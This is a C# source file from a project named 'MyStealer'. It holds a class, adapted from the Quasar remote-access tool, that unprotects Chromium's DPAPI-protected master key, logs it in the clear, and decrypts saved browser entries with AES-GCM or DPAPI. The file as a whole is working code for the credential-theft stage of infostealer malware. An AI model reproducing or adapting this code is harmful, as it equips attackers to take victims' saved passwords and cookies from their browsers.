﻿using System.IO;
using System;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using Serilog;

namespace MyStealer.Utils.Chromium
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
    /// </summary>
    public class ChromiumDecryptor
    {
        private static readonly ILogger logger = LogExt.ForModule(nameof(ChromiumDecryptor));

        private readonly byte[] aesKey;

        public ChromiumDecryptor(string encryptedKey)
        {
            if (encryptedKey == null)
                return;
            try
            {
                logger.Information("DPAPI-protected Chromium-protect key is {key}", encryptedKey);
                aesKey = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
                logger.Information("Decrypted Chromium-protect key is {key}", Convert.ToBase64String(aesKey));
            }
            catch (Exception e)
            {
                logger.Error(e, "Error reading and unprotecting Chromium encryption key");
            }
        }

        public string Decrypt(int length, byte[] payload)
        {
            if (payload.Length >= 3 && payload[0] == 'v' && payload[1] == '1' && payload[2] == '0') // 'v10' prefix -> AES-GCM encrypted
            {
                if (aesKey == null)
                {
                    logger.Warning("The chromium entry is AES-GCM encrypted ('v10' header exist) but the encryption key is not available");
                    return "";
                }

                try
                {
                    return Encoding.UTF8.GetString(DecryptAesGcm(length, payload, aesKey, 3));
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Decryption failed!");
                    return Convert.ToBase64String(payload);
                }
            }

            return Encoding.UTF8.GetString(ProtectedData.Unprotect(payload, null, DataProtectionScope.CurrentUser));
        }

        private byte[] DecryptAesGcm(int payloadLength, byte[] payload, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
            if (payload == null || payload.Length == 0)
                throw new ArgumentException("Payload is empty!", nameof(payload));

            using (var cipherStream = new MemoryStream(payload))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                _ = cipherReader.ReadBytes(nonSecretPayloadLength); // strip nasty 'v10' prefix
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipherText = cipherReader.ReadBytes(payloadLength - nonSecretPayloadLength - NONCE_BIT_SIZE / 8 - MAC_BIT_SIZE / 8);

                // according to the GCM specification, tag is appended at the END of ciphertext
                // https://stackoverflow.com/q/67989548
                var mac = cipherReader.ReadBytes(MAC_BIT_SIZE / 8);
                return BCryptAesGcm.GcmDecrypt(cipherText, key, nonce, mac);
            }
        }
    }
}
